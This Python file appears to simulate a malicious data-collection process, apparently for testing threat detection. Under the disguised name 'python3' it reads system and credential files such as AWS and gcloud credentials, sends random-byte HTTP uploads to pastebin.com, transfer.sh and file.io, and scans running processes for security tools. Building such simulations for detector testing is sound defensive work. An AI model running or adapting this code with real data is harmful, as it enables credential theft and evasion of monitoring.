from __future__ import annotations

import os
import pathlib
import time
import random
import sys
sys.path.insert(0, str(pathlib.Path(__file__).parents[2]))
from spawner.utils import set_proc_name, log, jitter

# Legitimate name but running from /home/claude — wrong location, no reason to be long-running
PROC = "python3"

SENSITIVE_FILES = [
    "/etc/passwd",
    "/etc/group",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/os-release",
    "/proc/version",
    "/proc/cpuinfo",
]

USER_FILES = [
    "~/.bash_history",
    "~/.bashrc",
    "~/.profile",
    "~/.ssh/known_hosts",
    "~/.ssh/config",
    "~/.aws/credentials",
    "~/.config/gcloud/credentials.db",
]

EXFIL_TARGETS = [
    ("pastebin.com", 443),
    ("transfer.sh", 443),
    ("file.io", 443),
]


def read_sensitive() -> None:
    targets = SENSITIVE_FILES + [str(pathlib.Path(f).expanduser()) for f in USER_FILES]
    for path in random.sample(targets, 3):
        try:
            content = pathlib.Path(path).read_text()
            log(PROC, f"Read {path}: {len(content)} bytes — exfil candidate")
        except Exception:
            pass


def fake_exfil() -> None:
    host, port = random.choice(EXFIL_TARGETS)
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        payload = b"POST /upload HTTP/1.1\r\nHost: " + host.encode() + b"\r\nContent-Length: 1024\r\n\r\n" + os.urandom(1024)
        s.sendall(payload)
        log(PROC, f"Exfil attempt to {host}:{port}")
        s.close()
    except Exception as e:
        log(PROC, f"Exfil to {host}:{port} failed: {e}")


def main() -> None:
    set_proc_name(PROC)
    log(PROC, "Starting data collection script")

    while True:
        read_sensitive()
        if random.random() < 0.3:
            fake_exfil()

        # Check for AV/EDR tools — evasion behavior
        security_tools = ["auditd", "ossec", "wazuh", "crowdstrike", "cylance", "sentinel"]
        try:
            running = pathlib.Path("/proc").iterdir()
            for pid_dir in running:
                if not pid_dir.name.isdigit():
                    continue
                try:
                    comm = (pid_dir / "comm").read_text().strip()
                    if any(tool in comm.lower() for tool in security_tools):
                        log(PROC, f"Security tool detected: {comm} (PID {pid_dir.name})")
                except Exception:
                    pass
        except Exception:
            pass

        time.sleep(jitter(45.0))


main()
